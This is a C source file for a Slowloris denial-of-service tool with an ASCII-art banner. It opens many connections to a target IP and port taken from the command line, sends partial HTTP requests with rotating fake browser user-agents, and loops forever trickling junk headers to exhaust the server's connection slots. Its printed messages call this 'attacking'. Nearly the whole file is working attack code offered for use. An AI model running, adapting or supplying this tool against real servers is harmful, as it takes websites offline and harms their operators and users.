#include <time.h>
#include <stdio.h>
#include <netdb.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#define RND (65 + (rand() % 26))

const char *image =
"                                                                                                                                                       \n"
"                                                 ^~!7??JJ???77???JJ???7!^                                                                              \n"
"                                              ^75P5J??J5G#BP5PP?77777?JY55Y7~                                                                          \n"
"                              ~J~            ?G57^ ^?55J7~^              ~7JPPJ!^                                                                      \n"
"                              ^5G?^        ^5B!  ^YGY!              ^^^^~~~^~!JPPY7^                                                                   \n"
"                                !GP!       YB~  !B5~         ^~7?YYY55YYYYYYYJY5P#&#GY7!~^^                                                            \n"
"                                 ^JGY^    ^B5  !#J        ~?5P5J?7!~^^         ^^~!7J5PPPP5!                                                           \n"
"                                   ~5B?   ^B5 ^PP      ~JPPJ!^                           ^^                                                            \n"
"                                     !PG7  PP !#?   ^?5PJ~                                                                                             \n"
"                                       7GP~7B~7B~.^?G57                                                                                                \n"
"                         !7^            ^JG5BY7B~7GP!                                                                                                  \n"
"                         !PP?^            ~Y&#JBPG?                                    ~?YYJ!^ ^!~^!7~                                                 \n"
"                           !5GJ~            !B#@B~                         ^^~!^   ^^75PY!!?P5Y5GGP55BYJJ7^      ^~7?7!^                               \n"
"                             ~JG5!           ^?#B~                   ~5GYY555YJ~?5YPP5?^     ^^ ^~^  77!7PG!   ~YP5J??5GJ^                             \n"
"                               ^?PP?^          ^YG?           ^7!~?YYPY7?7~^    ^^~~^                    ~GBYJPBJ~~77~ !BY                             \n"
"                                  !PG?^          7GP~      ^PGGB5557~^                                    ^^~G#P5G#5JGY ?#~                            \n"
"                                    7PP!          ^YB7     Y#77~                                ^^~5555?^   ^7^~BPJP5PG !B~                            \n"
"                                      ?GY^          7B5^ ^7BJ             ^^^^               ~7YPPG#7^!PG~      ~^ ^7BG J#~                            \n"
"                                       ~5G!          ~PG5P#5           ~J555555YJ7^         JBY7~^^^^   7~          ^G5^GP                             \n"
"                                         ?GJ          ^B@?^^         ^5GJ!^  ^~!7Y55J~     ^?!                      ^5PPB~                             \n"
"                                 ^~777!~!!?#P~        ^?YBJ         ^PP^  ^?5555J!^~JPP7^                             !P&J                             \n"
"                             ^7J5P#&BPB&&&##&#Y!         !B5^       7#!   5B!^^~?PP7  7PP!                            ~#P^                             \n"
"                          ^?5PY?5G5!~YG?~~~~~?#P^         ~GP~      7#!  ^BJ    . !PP~. YG^                            JB!                             \n"
"                        ~YPY!^!G5~  5B~       ~PG!         ^PG~     ^PP^ ^G5   ~7JYY##!  ^                    ^^^      ~#J                             \n"
"                      ^YGY^  J#?   ^B?          YB?         ^YB7     ~GP~ ?#?!PPY7!!!?!           ^       ^7Y55Y55Y!   J#?                             \n"
"                     ~GP~   YB!    ^BY           5&Y^         JB?     ^JGY!7PBB~               ^?GP57    7G57^^ ^~?GY^ ^7B?                            \n"
"                    ~B5    ?#7      YB^         7B?PG~         7BJ      ^?7 !7^         ^^    ~PP7^7GP~ ^G&!^^~^   !#7   ?#?                           \n"
"                   ^GP^   ~BY       ~#?        ^PG^ JB?         !B5^       ?#7        ~5PY~  ?BY!7!~^YB7 Y&GP5YP5~ !#7  ^5B7                           \n"
"                   ?#!    YB^        YG^        5&7  7BY^        ~PG~      7#Y       7BY~^  ?B5GP5JPP!5B^Y@B^  ^BP PP^  ~#?.                           \n"
"                   PP    ~BJ         !#7       ^Y&J   ~B5^        ^YB7     ^PP???7   ?BPP7 ^G5G5  .^GPJ#~7&#577YGYPG~   ^PB7                           \n"
"                  ^B5    ?#~         ~#Y       !#P?7^  ~GP^         ?BJ     ^!7?!!    P#!   YBBG!^~JBJG5  JBBGGPPPJ^    !BYPPJ!^                       \n"
"                   PP^   5P          ~#Y       ^!?P#7   ~B5^         !GP~      ^^     ?P5?  ^JB##GGP5G5^   ^7???7^   ~Y7PG^ ~J#5                       \n"
"                   ?#!  ^B5          ?#!         .7&Y^^  ~B5^         ^5B7   !P5?      ^~^    ^!?JJJ7~               !&G?^    7#Y^                     \n"
"                   ^PP^ ~BY         !BY           7#Y5? ~JGBPJ7!^       7BY^ ?#5J7                      7YYY57       Y&!       7PG~                    \n"
"                    ~BY ^B5       ^JBY^            ?@P77#Y^ 7B@#G!       ~PG! ^7GBJ!                   !#Y^^?#7    7PP5^        7#?                    \n"
"                     !BJ YG^    !YG5!              ^J&J~GGYJ5&&P#Y         JB?^!JP##J?J7~              ^PP~^!BJ ^7BP?^         ~P&?                    \n"
"                      !BY!#7. 7PP?^                 7&5~?&J~!!5#BP5J^    ^YP#&P5?!~?Y55YP5!             ^J555J7GPPY^            ^JB7                   \n"
"                       ~GPPB75G7                    !P#J^YG~. YBYPP#Y    ^5&&PJ?~       ^?G5J??777!!~^   .^7JYGY^              ^PP&5                   \n"
"                        ^YBB#B~                      7BY^~#BYYG#P#@&J      ^!?Y#P^        ^!7?????JYY55P5JBP?!^        ~J^     ~#G?~                   \n"
"                          7G#B^                      ?BG~^PBG5YP@G#@G^~7?JYYY55?^          ........ ~JGG?7!^           ?#!     7#Y                     \n"
"                           ~B@7                       ?#Y7^~~!7J5PPYGB&&B7~^^^           ~7??????JY55J!                ~BY     ^5#J                    \n"
"                            ~#P                       ~P#J          ~P@#&BPPP5?        ~5PYJJJ???7!^                ^PB7JB~  ^7G5?~                    \n"
"                             77                       PG^             5@&BJ!~^        7BY^                          ?#YB5#7  ?#Y^                      \n"
"                                                      JBJ!            J@&&J7J5GP!    !##!                         ~5#B^!55~  ^G5^                      \n"
"                                                       ~P#5!          ^P#G&B##P!  ^~?B&##5?^     ^~^            ~JGY7!^    ^?75&~                      \n"
"                                                        ^~5BYP5?       P5 ?#@BBPY55PPYB#&&&7   75P5Y^           !?~        ~#BY?^                      \n"
"                                                          ^JY7J#7      ?B?^~JYYJ!^ ^~7P&@G5G7~PB?^ ^                       !#Y                         \n"
"                                                              ^GP^      !PG~.   !?Y5P#@@#! ?&GG#5~                         !#7                         \n"
"                                                               7#7       ^YPPG7^???7?GBY~   5P5B~                      ~PBJJ#7                         \n"
"                                                                YBJ?^      ^^JPP5GGY?!^     PP!B5^                    !B57?J7^                         \n"
"                                                                ^7YBPJJ?7!~!J7^^^?#Y .    ~5B!^BP!^                   5#~                              \n"
"                                                                   ^7?!7JYYYGBYYY5PGP!^~?5PY~  !G#!               ^7!^J#~                              \n"
"                                                                            ^~~~~^ ~BB5YJ7^    ^5GP!            7PGG55P?^                              \n"
"                                                                                   Y#J~^~7?^     ~BP!^^   ^^^^~YB?~^ ^                                 \n"
"                                                                                   ^7BBYYY7^~~    ^?BBBP?5PP55PY~                                      \n"
"                                                                                     7P5YJJ5P7!!  !5G7!B#?^^^^                                         \n"
"                                                                                       7&PYJJP#PYPP?^  ^YB7                                            \n"
"                                                                                        ~??Y#&Y?7~       7B5^                                          \n"
"                                                                                            ~PP~.         ~PG!                                         \n"
"                                                                                              JB?           JBJ                                        \n"
"                                                                                               !GP~          !GP^                                      \n"
"                                                                                                ^5G7          ^YB7                                     \n"
"                                                                                                  7BY^          7B5^                                   \n"
"                                                                                                   ~PG!          ~J~                                   \n"
"                                                                                                     JBJ                                               \n"
"                                                                                                      !GP~                                             \n"
"                                                                                                       ^5B7                                            \n"
"                                                                                                         ?BY^                                          \n"
"                                                                                                          ~PY                                          \n"
"                                                                                                            ^                                          \n"
"                                                                                                                                                       \n"
"                                                                                                                                                       \n";


static const char *user_agents[] = {
	"Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0",
	"Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36 Edg/107.0.1418.26",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5113.212 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.58 Safari/537.36 Edg/102.0.1245.33",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/86.0.4240.77 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (X11; CrOS aarch64 15117.112.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
};

static void sigint_handler(int sig)
{
	static char msg[] = "See You Space Cowboy...\n";

	write(STDOUT_FILENO, msg, sizeof(msg));
	exit(0);
}

void sendPayload(int sock, char *ip_str)
{
	char buffer[256] = { 0 };

	srand(time(NULL));
	sprintf(buffer, "GET /%c%c%c%c HTTP/1.1\r\n", RND, RND, RND, RND);
	send(sock, buffer, strlen(buffer), MSG_NOSIGNAL);
	sprintf(buffer, "Host: %s\r\n", ip_str);
	send(sock, buffer, strlen(buffer), MSG_NOSIGNAL);
	sprintf(buffer, "User-Agent: %s\r\n", user_agents[RND &
			(sizeof(user_agents)/sizeof(char *) - 1)]);
	send(sock, buffer, strlen(buffer), MSG_NOSIGNAL);
	sprintf(buffer, "Content-Length: %d\r\n", RND);
	send(sock, buffer, strlen(buffer), MSG_NOSIGNAL);
}

void spam(int *sockets, int n_sockets, char *ip_str, struct sockaddr_in *target)
{
	int i;
	char buffer[16] = { 0 };

	srand(time(NULL));

	for (i = 0; i < n_sockets; ++i) {
		sprintf(buffer, "X-a: %c%c%c%c\r\n", RND, RND, RND, RND);
		if ((send(sockets[i], buffer, strlen(buffer), MSG_NOSIGNAL) < 0)) {
			printf("[!] May the server is not vulnerable to SlowLoris Attack: ");
			printf("recreating a new socket.\n");
			close(sockets[i]);
			sockets[i] = socket(AF_INET, SOCK_STREAM, 0);
			if ((connect(sockets[i], (struct sockaddr *) target,
						sizeof(struct sockaddr)) < 0)) {
				fprintf(stderr, "[!] can not create socket %d.\n",
						i);
				close(sockets[i]);
				return;
			} else {
				sendPayload(sockets[i], ip_str);
			}
		}
	}
}

void get_address(char *target_name, struct sockaddr_in *ptr)
{
	struct addrinfo hints, *res, *p;

	memset(&hints, 0, sizeof(struct addrinfo));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;

	if ((getaddrinfo(target_name, NULL, &hints, &res) == 0)) {
		for (p = res; p != NULL; p = p->ai_next) {
			if (p->ai_family == AF_INET) {
				struct sockaddr_in *aux =
					(struct sockaddr_in *) p->ai_addr;
				memcpy(&ptr->sin_addr.s_addr,
						&(aux->sin_addr),
						sizeof(unsigned int));
			}
		}
	} else {
		inet_pton(AF_INET, target_name,
				(void *) (&ptr->sin_addr.s_addr));
	}

	freeaddrinfo(p);
	freeaddrinfo(res);
}

int main(int argc, char *argv[])
{
	if (argc != 5) {
		printf("%s\n\n", image);
		printf("%s IP PORT SOCKETS SLEEP_TIME\n", argv[0]);
		return EXIT_FAILURE;
	}

	signal(SIGINT, sigint_handler);

	int i, launch = 1;
	int n_sockets = strtol(argv[3], NULL, 10);
	int tempo = strtol(argv[4], NULL, 10);
	char ip_str[INET_ADDRSTRLEN] = { 0 };
	struct sockaddr_in target;

	memset(&target, 0, sizeof(struct sockaddr_in));

	target.sin_family = AF_INET;
	target.sin_port = htons(strtol(argv[2], NULL, 10));

	get_address(argv[1], &target);

	inet_ntop(AF_INET, (void *) &target.sin_addr.s_addr, ip_str,
			sizeof(ip_str));

	printf("attacking address: %s\n", ip_str);

	int *sockets = (int *) malloc(n_sockets * sizeof(int *));

	if (sockets == NULL) {
		printf("[!] problem in memory allocation\nExiting...\n");
		return EXIT_FAILURE;
	}

	for (i = 0; i < n_sockets; ++i) {
		sockets[i] = socket(AF_INET, SOCK_STREAM, 0);

		if (sockets[i] == -1) {
			printf("[!] can not create socket %d.\n", i + 1);
			return EXIT_FAILURE;
		}
		printf("[i] created socket number %d.\n", i + 1);

		if ((connect(sockets[i], (struct sockaddr *) &target,
						sizeof(target)) < 0)) {
			printf("[!] can not create socket %d.\n", i + 1);
			return EXIT_FAILURE;
		}
		sendPayload(sockets[i], ip_str);
	}

	while (1) {
		printf("[i] launched number %d completed.\n", launch++);
		printf("[i] sleeping for %02d seconds.\n", tempo);
		spam(sockets, n_sockets, ip_str, &target);
		printf("[i] restarting attack.\n");
		sleep(tempo);
	}

	free(sockets);

	return 0;
}
